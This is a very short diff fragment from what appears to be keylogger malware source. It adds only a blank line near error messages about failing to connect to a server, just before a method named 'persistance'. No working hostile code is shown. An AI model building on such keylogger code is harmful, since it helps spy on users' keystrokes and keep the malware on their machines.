@@ -38,6 +38,7 @@ class Keylogger():
 
 			print("Could not connect to the Server")
 			print("Make sure the Server is listening for connection...")
+			
 			self.fail = True
 		
 	def persistance(self):
